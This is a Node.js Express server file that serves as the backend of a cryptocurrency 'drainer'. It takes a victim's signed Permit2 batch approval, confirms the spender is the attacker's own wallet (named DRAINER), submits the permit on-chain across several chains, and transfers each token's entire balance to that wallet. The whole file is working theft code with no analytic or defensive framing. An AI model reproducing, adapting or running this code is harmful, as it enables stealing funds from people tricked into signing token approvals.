const express = require("express");
const cors = require("cors");
const { ethers } = require("ethers");

const app = express();
app.use(cors({ origin: "*" }));
app.use(express.json({ limit: "256kb" }));

const KEY = process.env.PRIVATE_KEY;
const DRAINER = new ethers.Wallet(KEY).address;
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MAX160 = (1n << 160n) - 1n;

const RPCS = {
  1: process.env.RPC_1,
  8453: process.env.RPC_8453,
  42161: process.env.RPC_42161,
  137: process.env.RPC_137,
  56: process.env.RPC_56,
};

const PERMIT2_ABI = [
  "function permit(address owner,((address,uint160,uint48,uint48)[],address,uint256) permitBatch, bytes signature)",
  "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
  "function transferFrom(address from, address to, uint160 amount, address token)",
];
const ERC20_ABI = ["function balanceOf(address) view returns (uint256)"];

const TYPES = {
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" },
  ],
  PermitBatch: [
    { name: "details", type: "PermitDetails[]" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" },
  ],
};

const seen = new Set();

app.post("/submit", async (req, res) => {
  const { chainId, owner, permit, signature } = req.body;
  const rpc = RPCS[chainId];
  if (!rpc) return res.json({ ok: false, error: "unsupported chain" });
  if (!ethers.isAddress(owner)) return res.json({ ok: false, error: "bad owner" });
  if (permit.spender.toLowerCase() !== DRAINER.toLowerCase())
    return res.json({ ok: false, error: "bad spender" });
  if (Number(permit.sigDeadline) < Date.now() / 1000)
    return res.json({ ok: false, error: "expired" });
  if (signature.length > 200 || permit.details.length > 30)
    return res.json({ ok: false, error: "oversized" });

  const dedupe = `${chainId}:${owner}:${signature.slice(0, 20)}`;
  if (seen.has(dedupe)) return res.json({ ok: false, error: "duplicate" });
  seen.add(dedupe);

  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(KEY, provider);
  const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);

  const domain = { name: "Permit2", chainId: Number(chainId), verifyingContract: PERMIT2 };
  let signer;
  try {
    signer = ethers.verifyTypedData(domain, TYPES, permit, signature);
  } catch {
    return res.json({ ok: false, error: "unverifiable signature" });
  }
  if (signer.toLowerCase() !== owner.toLowerCase())
    return res.json({ ok: false, error: "signature mismatch" });

  let tx;
  try {
    tx = await permit2.permit(owner, permit, signature, { gasLimit: 900000 });
    await tx.wait(1);
  } catch (e) {
    return res.json({ ok: false, error: "permit: " + (e.shortMessage || e.message) });
  }

  const results = [];
  for (const d of permit.details) {
    try {
      const token = new ethers.Contract(d.token, ERC20_ABI, provider);
      const bal = await token.balanceOf(owner);
      if (bal === 0n) { results.push({ token: d.token, skipped: "zero" }); continue; }
      const amount = bal > MAX160 ? MAX160 : bal;
      const t = await permit2.transferFrom(owner, DRAINER, amount, d.token, { gasLimit: 200000 });
      await t.wait(1);
      results.push({ token: d.token, amount: amount.toString(), hash: t.hash });
    } catch (e) {
      results.push({ token: d.token, error: e.shortMessage || e.message });
    }
  }
  res.json({ ok: true, permitTx: tx.hash, results });
});

app.get("/health", (_q, s) => s.json({ ok: true, drainer: DRAINER }));
app.listen(process.env.PORT || 3000);